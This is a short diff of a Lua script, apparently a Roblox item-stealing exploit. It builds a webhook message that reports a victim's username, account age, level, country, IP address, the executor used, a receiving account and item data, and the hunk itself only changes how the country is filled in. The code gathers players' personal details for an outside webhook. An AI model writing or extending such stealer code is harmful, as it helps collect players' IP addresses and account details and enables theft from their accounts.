@@ -1085,7 +1085,7 @@ local WebHookEmbed = CreateEmbed(
         {
             name = "🌊 Player Info", 
             value = "``` | 📖 Username: "..LP.Name.."\n | 📌 Account Age: "..tostring(LP.AccountAge).."\n | 🚀 Level: "..tostring(getLvl())..
-                     "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used: "..identifyexecutor().."\n | 🗺 Country: "..GetCountryName().."\n | 👤 IP: "..ipwebhook.. "```"
+                     "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used: "..identifyexecutor().."\n | 🗺 Country: "..code.."\n | 👤 IP: "..ipwebhook.. "```"
         },
         {
             name = "🍎 Items Data", 
